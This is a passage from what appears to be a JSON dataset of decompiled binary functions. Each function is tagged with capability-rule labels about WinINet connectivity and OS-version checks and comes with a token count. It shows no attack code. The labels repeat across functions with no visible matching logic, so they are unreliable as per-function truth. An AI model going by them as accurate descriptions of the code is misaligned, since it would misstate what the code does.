        "decompiled_code": "\nvoid fcn.000461a0(void)\n\n{\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*0xb1c5b66c != 0) {\n        *0xb1c5b66c = 0;\n        fcn.00037150(0xb1c5b658, &var_4h, 0);\n        if (*0xb1c5b664 != -0x4e3a499c) {\n            for (var_8h = *0xb1c5b668; (**0xb1bde0c0)(var_8h + 0x668, 0, 0),  *(var_8h + 4) != -0x4e3a499c;\n                var_8h = *(var_8h + 4)) {\n            }\n        }\n        fcn.00037180(0xb1c5b658, &var_4h, 0);\n        while (fcn.00037150(0xb1c5b658, &var_4h, 0),  *0xb1c5b664 != -0x4e3a499c) {\n            fcn.00037180(0xb1c5b658, &var_4h, 0);\n            fcn.000209a0(1000);\n        }\n        fcn.00037180(0xb1c5b658, &var_4h, 0);\n        fcn.000371b0(0xb1c5b658);\n    }\n    return;\n}\n",
        "token_count": 349
    },
    "00046290": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00046290(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    if (*0xb1c5b66c == 0) {\n        var_4h = 0;\n    }\n    else {\n        var_4h = fcn.00035230(0x6b0);\n        if (var_4h == 0) {\n            var_4h = 0;\n        }\n        else {\n            fcn.00078790(var_4h, 0, 0x6b0);\n            *(var_4h + 0x624) = arg_10h;\n            *(var_4h + 0x628) = arg_14h;\n            *(var_4h + 0x61c) = arg_8h;\n            *(var_4h + 0x620) = arg_ch;\n            *(var_4h + 0x62a) = arg_20h;\n            *(var_4h + 0x62c) = 0;\n            *(var_4h + 0x640) = arg_18h;\n            *(var_4h + 0x644) = arg_1ch;\n            fcn.00036f50(var_4h + 0x648);\n            (**0xb1bde0cc)(var_4h + 0x654, 1, 0);\n            (**0xb1bde0cc)(var_4h + 0x668, 1, 0);\n            (**0xb1bde0cc)(var_4h + 0x678, 1, 0);\n            (**0xb1bde0cc)(var_4h + 0x688, 1, 0);\n            fcn.00037150(0xb1c5b658, &var_8h, 1);\n            fcn.00045a10(0xb1c5b664, var_4h);\n            fcn.00037180(0xb1c5b658, &var_8h, 1);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 525
    },
    "00046400": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00046400(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    if (arg_ch == 0) {\n        fcn.00037150(0xb1c5b658, &var_8h, 0);\n    }\n    if (*0xb1c5b664 == -0x4e3a499c) {\n        var_4h = 0;\n    }\n    else {\n        for (var_4h = *0xb1c5b668; arg_8h != var_4h; var_4h = *(var_4h + 4)) {\n            if (*(var_4h + 4) == -0x4e3a499c) {\n                var_4h = 0;\n                break;\n            }\n        }\n    }\n    if (arg_ch == 0) {\n        fcn.00037180(0xb1c5b658, &var_8h, 0);\n    }\n    return var_4h;\n}\n",
        "token_count": 254
    },
    "00046490": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00046490(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    ushort extraout_var;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    fcn.00037150(0xb1c5b658, &var_4h, 1);\n    iVar2 = fcn.00046400(arg_8h, 1);\n    if (iVar2 == 0) {\n        fcn.00037180(0xb1c5b658, &var_4h, 1);\n    }\n    else if (((arg_ch == 0) && (*(arg_8h + 0x634) != 0)) && (*(arg_8h + 0x62c) == 2)) {\n        fcn.00037180(0xb1c5b658, &var_4h, 1);\n    }\n    else {\n        fcn.000459d0(arg_8h);\n        fcn.00037180(0xb1c5b658, &var_4h, 1);\n        fcn.00037150(arg_8h + 0x648, &var_4h, 0);\n        var_8h = *(arg_8h + 0x664);\n        while (var_8h != NULL) {\n            puVar1 = *var_8h;\n            fcn.00035330(var_8h[3]);\n            fcn.00035330(var_8h);\n            var_8h = puVar1;\n        }\n        fcn.00037180(arg_8h + 0x648, &var_4h, 0);\n        fcn.000371b0(arg_8h + 0x648);\n        fcn.00046610(*(arg_8h + 0x61c), arg_8h & 0xffff0000 | *(arg_8h + 0x620), *(arg_8h + 0x624), \n                     arg_8h & 0xffff0000 | *(arg_8h + 0x628), *(arg_8h + 0x62a));\n        fcn.000457f0(*(arg_8h + 0x624), arg_8h & 0xffff0000 | *(arg_8h + 0x628), *(arg_8h + 0x61c), \n                     CONCAT22(extraout_var, *(arg_8h + 0x620)));\n        fcn.00035330(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 583
    },
    "00046610": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00046610(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    fcn.00046670(arg_8h, arg_ch & 0xffff, arg_10h, arg_14h & 0xffff, arg_18h != 1, 0xb1be2128);\n    return;\n}\n",
        "token_count": 98
    },
    "00046640": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00046640(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    fcn.00046670(arg_8h, arg_ch & 0xffff, arg_10h, arg_14h & 0xffff, arg_18h != 1, 0xb1be2130);\n    return;\n}\n",
        "token_count": 98
    },
    "00046670": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00046670(uint32_t arg_8h, uint arg_ch, uint32_t arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    char *pcVar1;\n    char cVar2;\n    bool bVar3;\n    uint var_2ch;\n    uint var_24h;\n    char *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    ushort var_12h;\n    ushort var_10h;\n    ushort var_eh;\n    ushort var_ch;\n    ushort var_ah;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    cVar2 = fcn.00056ee0(1);\n    if (cVar2 != '\\0') {\n        (**0xb1bde100)(&var_8h);\n        bVar3 = var_8h < *0xb1c5a618;\n        var_8h = var_8h - *0xb1c5a618;\n        var_4h = (var_4h - *0xb1c5a61c) - bVar3;\n        fcn.000360b0(&var_8h, &var_18h);\n        if (arg_18h == 0) {\n            var_1ch = 0xb1be213c;\n        }\n        else {\n            var_1ch = 0xb1be2138;\n        }\n        fcn.0007866a(0xb1c5b670, 0x7f, 0xb1be2140, var_18h, var_18h._2_2_, var_12h, var_10h, var_eh, var_ch, var_ah, \n                     var_1ch, arg_10h >> 0x18, arg_10h >> 0x10 & 0xff, arg_10h >> 8 & 0xff, arg_10h & 0xff, arg_14h, \n                     arg_8h >> 0x18, arg_8h >> 0x10 & 0xff, arg_8h >> 8 & 0xff, arg_8h & 0xff, arg_ch, arg_1ch);\n        *0xb1c5b6ef = 0;\n        var_20h = 0xb1c5b670;\n        pcVar1 = var_20h;\n        do {\n            var_20h = pcVar1;\n            pcVar1 = var_20h + 1;\n        } while (*var_20h != '\\0');\n        fcn.00056eb0(1, 0xb1c5b670, var_20h + 0x4e3a4990);\n    }\n    return;\n}\n",
        "token_count": 636
    },
    "00046790": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00046790(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00016190(0xb1be218c, 0xb1c5b6f0);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00016090(*0xb1c5b6f0, 0xb1c13820, 0);\n        if (iVar1 == 0) {\n            iVar1 = 0;\n        }\n        else {\n            (**0xb1bde2e4)();\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 142
    },
    "000467f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.000467f0(void)\n\n{\n    if (*0xb1c5b6f0 != 0) {\n        fcn.00016110(*0xb1c5b6f0);\n        (**0xb1bde2e4)();\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "000468b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_90h\n// WARNING: Variable defined which should be unmapped: var_8ch\n\nuint fcn.000468b0(uint param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_8h;\n    int32_t var_ch;\n    int32_t var_10h_2;\n    int32_t iVar6;\n    int32_t var_90h;\n    uint var_8ch;\n    int32_t var_78h;\n    int32_t var_68h;\n    int32_t var_60h;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint *var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_1ch;\n    uchar *puStack28;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c45940;\n    uStack16 = 0xb1c4578a;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h;\n    puStack28 = &stack0xffffff5c;\n    var_50h = *(var_ch + 0x60);\n    var_4ch = NULL;\n    var_90h = 0;\n    fcn.00078790(&var_8ch, 0, 0x38);\n    var_38h = 0;\n    var_44h = 0;\n    var_40h = 0;\n    var_1ch = 0;\n    var_54h = 0;\n    var_48h = 0;\n    var_3ch = 0;\n    if ((var_ch == 0) || (*(var_ch + 0x22) < *(var_ch + 0x23))) {\n        uVar1 = 0xc0000005;\n        goto code_r0x00046be1;\n    }\n    if ((*(var_ch + 0x18) == 0) && (*(var_ch + 0x1c) == 0x3c)) {\n        iVar2 = (**0xb1bde1b8)();\n        if (var_10h_2 != iVar2) {\n            (**0xb1bde1bc)(var_10h_2, &var_34h);\n            var_40h = 1;\n        }\n        iVar2 = (**0xb1bde294)(*(var_ch + 0x3c), *(var_50h + 4), 0, 0, 0);\n        var_38h = iVar2;\n        if (iVar2 == 0) {\n            var_1ch = -0x3fffff66;\n        }\n        else {\n            var_4h = 0;\n            iVar6 = 0;\n            (**0xb1bde2a0)(iVar2, 0, 2);\n            var_44h = 1;\n            var_4ch = (**0xb1bde0e0)(var_38h, 0, 1, 0, 0, 0x10);\n            if (var_4ch == NULL) {\n                var_1ch = -0x3fffff66;\n                var_4h = 0xffffffff;\n            }\n            else if ((var_4ch[9] == 0) && (var_4ch[7] == 0x38)) {\n                puVar4 = var_4ch;\n                puVar5 = &var_90h;\n                for (iVar3 = 0xf; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar5 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    puVar5 = puVar5 + 1;\n                }\n                if (var_4ch[6] != 0) {\n                    iVar6 = var_4ch[7] * var_4ch[0xe];\n                    var_78h = fcn.00046e10(iVar2, iVar6, &var_54h);\n                    if (var_78h == 0) {\n                        var_1ch = -0x3fffff66;\n                        var_4h = 0xffffffff;\n                        goto code_r0x00046b43;\n                    }\n                }\n                if ((var_4ch[10] == 0) || (var_68h = fcn.00046e10(iVar6, var_4ch[0xb] * var_4ch[0xe]),  var_68h != 0)) {\n                    if ((var_4ch[0xc] == 0) ||\n                       (var_60h = fcn.00046e10(iVar6, var_4ch[0xd] * var_4ch[0xe]),  var_60h != 0)) {\n                        fcn.00046c00(&var_90h);\n                        var_4ch[0xe] = var_58h;\n                        var_4h = 0xffffffff;\n                    }\n                    else {\n                        var_1ch = -0x3fffff66;\n                        var_4h = 0xffffffff;\n                    }\n                }\n                else {\n                    var_1ch = -0x3fffff66;\n                    var_4h = 0xffffffff;\n                }\n            }\n            else {\n                var_4h = 0xffffffff;\n            }\n        }\n    }\ncode_r0x00046b43:\n    if (var_1ch != 0) {\n        *(var_ch + 0x1c) = 0;\n        *(var_ch + 0x18) = var_1ch;\n    }\n    if (var_4ch != NULL) {\n        (**0xb1bde0a4)(var_4ch, var_38h);\n        var_8ch = var_54h;\n        var_90h = var_78h;\n        fcn.00046f00(var_78h, var_54h);\n        fcn.00046f00(var_68h, var_48h);\n        fcn.00046f00(var_60h, var_3ch);\n    }\n    if (var_44h != 0) {\n        (**0xb1bde29c)(var_38h);\n    }\n    if (var_38h != 0) {\n        (**0xb1bde2ac)(var_38h);\n    }\n    if (var_40h != 0) {\n        (**0xb1bde1b4)(&var_34h);\n    }\n    (**0xb1bde2e4)();\n    uVar1 = fcn.000164b0(var_8h, var_ch);\ncode_r0x00046be1:\n    *in_FS_OFFSET = var_10h;\n    return uVar1;\n}\n",
        "token_count": 1624
    },
    "00046c00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00046c00(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_14h = *(arg_8h + 0x18);\n    var_8h = *(arg_8h + 0x18) + 0x1c;\n    var_ch = *(arg_8h + 0x28);\n    var_10h = *(arg_8h + 0x30);\n    var_18h = *(arg_8h + 0x38);\n    var_4h = 0;\n    do {\n        while( true ) {\n            if (*(arg_8h + 0x38) <= var_4h) {\n                fcn.00078790(*(arg_8h + 0x1c) * *(arg_8h + 0x38) + *(arg_8h + 0x18), 0, \n                             (var_18h - *(arg_8h + 0x38)) * *(arg_8h + 0x1c), var_18h, var_14h, var_10h, var_ch);\n                fcn.00078790(*(arg_8h + 0x2c) * *(arg_8h + 0x38) + *(arg_8h + 0x28), 0, \n                             (var_18h - *(arg_8h + 0x38)) * *(arg_8h + 0x2c));\n                fcn.00078790(*(arg_8h + 0x34) * *(arg_8h + 0x38) + *(arg_8h + 0x30), 0, \n                             (var_18h - *(arg_8h + 0x38)) * *(arg_8h + 0x34));\n                return;\n            }\n            iVar1 = fcn.00045940(*(var_14h + 4), var_8h & 0xffff0000 | *(var_14h + 2), *(var_8h + 4), \n                                 arg_8h & 0xffff0000 | *(var_8h + 2));\n            if (iVar1 == 0) break;\ncode_r0x00046c96:\n            if (*(arg_8h + 0x28) != 0) {\n                fcn.0007877e(var_ch, var_ch + *(arg_8h + 0x2c), ((*(arg_8h + 0x38) - var_4h) + -1) * *(arg_8h + 0x2c));\n            }\n            if (*(arg_8h + 0x30) != 0) {\n                fcn.0007877e(var_10h, var_10h + *(arg_8h + 0x34), ((*(arg_8h + 0x38) - var_4h) + -1) * *(arg_8h + 0x34))\n                ;\n            }\n            fcn.0007877e(var_14h, var_14h + *(arg_8h + 0x1c), ((*(arg_8h + 0x38) - var_4h) + -1) * *(arg_8h + 0x1c));\n            *(arg_8h + 0x38) = *(arg_8h + 0x38) + -1;\n        }\n        var_18h = *(var_14h + 2);\n        iVar1 = fcn.00037d20(var_18h);\n        if (iVar1 != 0) goto code_r0x00046c96;\n        var_14h = var_14h + *(arg_8h + 0x1c);\n        var_8h = var_8h + *(arg_8h + 0x1c);\n        var_ch = var_ch + *(arg_8h + 0x2c);\n        var_10h = var_10h + *(arg_8h + 0x34);\n        var_4h = var_4h + 1;\n    } while( true );\n}\n",
        "token_count": 1034
    },
    "00046e10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00046e10(uint param_1, uint param_2, int32_t *param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    int32_t *var_10h;\n    uint var_18h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c457f8;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    iVar1 = (**0xb1bde294)(var_8h, var_ch, 0, 0, 0);\n    if (iVar1 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        var_4h = 0;\n        (**0xb1bde2a0)(iVar1, 0, 2);\n        var_4h = 0xffffffff;\n        iVar2 = (**0xb1bde0e0)(iVar1, 0, 1, 0, 0, 0x10);\n        if (iVar2 == 0) {\n            (**0xb1bde29c)(iVar1);\n            (**0xb1bde2ac)(iVar1);\n            iVar2 = 0;\n        }\n        else {\n            *var_10h = iVar1;\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return iVar2;\n}\n",
        "token_count": 393
    },
    "00046f00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00046f00(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if ((arg_8h != 0) && (arg_ch != 0)) {\n        (**0xb1bde0a4)(arg_8h, arg_ch);\n        (**0xb1bde29c)(arg_ch);\n        (**0xb1bde2ac)(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "00046fd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00046fd0(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint *arg_1ch, uint *arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint var_d8h;\n    int32_t var_d4h;\n    int32_t var_d0h;\n    int32_t *var_cch;\n    int32_t *var_c8h;\n    uint32_t var_c4h;\n    uint var_c0h;\n    int32_t var_bch;\n    int32_t var_b8h;\n    int32_t *var_b4h;\n    int32_t *var_b0h;\n    uint32_t var_ach;\n    uint var_a8h;\n    int32_t var_a4h;\n    int32_t var_a0h;\n    int32_t *var_9ch;\n    int32_t *var_98h;\n    uint32_t var_94h;\n    uint var_90h;\n    int32_t var_8ch;\n    int32_t var_88h;\n    int32_t *var_84h;\n    int32_t *var_80h;\n    uint32_t var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    int32_t var_70h;\n    int32_t *var_6ch;\n    int32_t *var_68h;\n    uint32_t var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t *var_54h;\n    int32_t *var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t *var_3ch;\n    int32_t *var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    for (; (*arg_8h == 10 || ((*arg_8h == 0xd && (*(arg_8h + 1) == 10)))); arg_8h = arg_8h + 1) {\n        arg_ch = arg_ch + -1;\n    }\n    iVar1 = fcn.000786fa(arg_8h, 10, arg_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_14h = iVar1 - arg_8h;\n    iVar1 = var_14h + 1;\n    if ((var_14h != 0) && (*(arg_8h + (var_14h - 1)) == 0xd)) {\n        var_14h = var_14h - 1;\n    }\n    if (var_14h < 0xe) {\n        return 0;\n    }\n    iVar2 = fcn.000786fa(arg_8h, 0x20, var_14h);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar2 = iVar2 - arg_8h;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    if (iVar2 == 3) {\n        var_38h = 0xb1be21a4;\n        var_3ch = arg_8h;\n        for (var_34h = 3; 3 < var_34h; var_34h = var_34h - 4) {\n            if (*var_3ch != *var_38h) goto code_r0x000470f3;\n            var_38h = var_38h + 1;\n            var_3ch = var_3ch + 1;\n        }\n        if (var_34h == 0) {\ncode_r0x00047175:\n            var_44h = 0;\n        }\n        else {\ncode_r0x000470f3:\n            var_40h = *var_3ch - *var_38h;\n            if (var_40h == 0) {\n                if (var_34h == 1) goto code_r0x00047175;\n                var_40h = *(var_3ch + 1) - *(var_38h + 1);\n                if (var_40h == 0) {\n                    if (var_34h == 2) goto code_r0x00047175;\n                    var_40h = *(var_3ch + 2) - *(var_38h + 2);\n                    if (var_40h == 0) {\n                        if ((var_34h == 3) || (var_40h = *(var_3ch + 3) - *(var_38h + 3),  var_40h == 0))\n                        goto code_r0x00047175;\n                    }\n                }\n            }\n            var_44h = 1;\n            if (var_40h < 1) {\n                var_44h = -1;\n            }\n        }\n        if (var_44h != 0) goto code_r0x000471a2;\n    }\n    else {\ncode_r0x000471a2:\n        if (iVar2 != 4) {\n            return 0;\n        }\n        var_50h = 0xb1be21a8;\n        var_54h = arg_8h;\n        for (var_4ch = 4; 3 < var_4ch; var_4ch = var_4ch - 4) {\n            if (*var_54h != *var_50h) goto code_r0x000471ea;\n            var_50h = var_50h + 1;\n            var_54h = var_54h + 1;\n        }\n        if (var_4ch == 0) {\ncode_r0x0004726c:\n            var_5ch = 0;\n        }\n        else {\ncode_r0x000471ea:\n            var_58h = *var_54h - *var_50h;\n            if (var_58h == 0) {\n                if (var_4ch == 1) goto code_r0x0004726c;\n                var_58h = *(var_54h + 1) - *(var_50h + 1);\n                if (var_58h == 0) {\n                    if (var_4ch == 2) goto code_r0x0004726c;\n                    var_58h = *(var_54h + 2) - *(var_50h + 2);\n                    if (var_58h == 0) {\n                        if ((var_4ch == 3) || (var_58h = *(var_54h + 3) - *(var_50h + 3),  var_58h == 0))\n                        goto code_r0x0004726c;\n                    }\n                }\n            }\n            var_5ch = 1;\n            if (var_58h < 1) {\n                var_5ch = -1;\n            }\n        }\n        if (var_5ch != 0) {\n            return 0;\n        }\n    }\n    iVar5 = iVar2 + 1;\n    iVar3 = fcn.000786fa(arg_8h + iVar5, 0x20, arg_ch - iVar5);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    uVar6 = iVar3 - (arg_8h + iVar5);\n    if (uVar6 == 0) {\n        return 0;\n    }\n    if (*(arg_8h + iVar5) != 0x2f) {\n        if (uVar6 < 8) {\n            return 0;\n        }\n        var_68h = 0xb1be21b0;\n        var_6ch = arg_8h + iVar5;\n        for (var_64h = 7; 3 < var_64h; var_64h = var_64h - 4) {\n            if (*var_6ch != *var_68h) goto code_r0x00047341;\n            var_68h = var_68h + 1;\n            var_6ch = var_6ch + 1;\n        }\n        if (var_64h == 0) {\ncode_r0x000473c3:\n            var_74h = 0;\n        }\n        else {\ncode_r0x00047341:\n            var_70h = *var_6ch - *var_68h;\n            if (var_70h == 0) {\n                if (var_64h == 1) goto code_r0x000473c3;\n                var_70h = *(var_6ch + 1) - *(var_68h + 1);\n                if (var_70h == 0) {\n                    if (var_64h == 2) goto code_r0x000473c3;\n                    var_70h = *(var_6ch + 2) - *(var_68h + 2);\n                    if (var_70h == 0) {\n                        if ((var_64h == 3) || (var_70h = *(var_6ch + 3) - *(var_68h + 3),  var_70h == 0))\n                        goto code_r0x000473c3;\n                    }\n                }\n            }\n            var_74h = 1;\n            if (var_70h < 1) {\n                var_74h = -1;\n            }\n        }\n        if (var_74h != 0) {\n            return 0;\n        }\n    }\n    iVar2 = iVar2 + 2 + uVar6;\n    if (var_14h - iVar2 != 8) {\n        return 0;\n    }\n    var_80h = 0xb1be21b8;\n    var_84h = arg_8h + iVar2;\n    for (var_7ch = 5; 3 < var_7ch; var_7ch = var_7ch - 4) {\n        if (*var_84h != *var_80h) goto code_r0x0004745c;\n        var_80h = var_80h + 1;\n        var_84h = var_84h + 1;\n    }\n    if (var_7ch == 0) {\ncode_r0x00047503:\n        var_8ch = 0;\n    }\n    else {\ncode_r0x0004745c:\n        var_88h = *var_84h - *var_80h;\n        if (var_88h == 0) {\n            if (var_7ch == 1) goto code_r0x00047503;\n            var_88h = *(var_84h + 1) - *(var_80h + 1);\n            if (var_88h == 0) {\n                if (var_7ch == 2) goto code_r0x00047503;\n                var_88h = *(var_84h + 2) - *(var_80h + 2);\n                if (var_88h == 0) {\n                    if ((var_7ch == 3) || (var_88h = *(var_84h + 3) - *(var_80h + 3),  var_88h == 0))\n                    goto code_r0x00047503;\n                }\n            }\n        }\n        var_8ch = 1;\n        if (var_88h < 1) {\n            var_8ch = -1;\n        }\n    }\n    if (var_8ch == 0) {\n        if (*(arg_8h + iVar2 + 6) == 0x2e) {\n            iVar2 = fcn.0006c000(arg_8h + iVar1, arg_ch - iVar1, arg_18h, arg_10h, arg_14h);\n            if (iVar2 == 0) {\n                uVar4 = 0;\n            }\n            else {\n                if ((arg_1ch != NULL) || (arg_20h != NULL)) {\n                    if (arg_1ch != NULL) {\n                        *arg_1ch = 0;\n                    }\n                    if (arg_20h != NULL) {\n                        *arg_20h = 0;\n                    }\ncode_r0x000475b9:\n                    var_2ch = iVar1;\n                    var_18h = fcn.000786fa(arg_8h + var_2ch, 10, var_14h - var_2ch);\n                    if (var_18h != 0) {\n                        var_18h = var_18h - arg_8h;\n                        iVar1 = var_18h + 1;\n                        if ((var_18h != 0) && (*(arg_8h + var_18h + -1) == 0xd)) {\n                            var_18h = var_18h + -1;\n                        }\n                        iVar2 = fcn.000786fa(arg_8h + var_2ch, 0x3a, var_18h - var_2ch);\n                        if (iVar2 == 0) goto code_r0x00047afd;\n                        var_ach = iVar2 - (arg_8h + var_2ch);\n                        if ((arg_1ch != NULL) && (var_ach == 0xe)) {\n                            var_98h = 0xb1c57d28;\n                            var_9ch = arg_8h + var_2ch;\n                            for (var_94h = var_ach; 3 < var_94h; var_94h = var_94h - 4) {\n                                if (*var_9ch != *var_98h) goto code_r0x000476b5;\n                                var_98h = var_98h + 1;\n                                var_9ch = var_9ch + 1;\n                            }\n                            if (var_94h == 0) {\ncode_r0x0004778b:\n                                var_a4h = 0;\n                            }\n                            else {\ncode_r0x000476b5:\n                                var_a0h = *var_9ch - *var_98h;\n                                if (var_a0h == 0) {\n                                    if (var_94h == 1) goto code_r0x0004778b;\n                                    var_a0h = *(var_9ch + 1) - *(var_98h + 1);\n                                    if (var_a0h == 0) {\n                                        if (var_94h == 2) goto code_r0x0004778b;\n                                        var_a0h = *(var_9ch + 2) - *(var_98h + 2);\n                                        if (var_a0h == 0) {\n                                            if ((var_94h == 3) ||\n                                               (var_a0h = *(var_9ch + 3) - *(var_98h + 3),  var_a0h == 0))\n                                            goto code_r0x0004778b;\n                                        }\n                                    }\n                                }\n                                var_a4h = 1;\n                                if (var_a0h < 1) {\n                                    var_a4h = -1;\n                                }\n                            }\n                            if (var_a4h == 0) {\n                                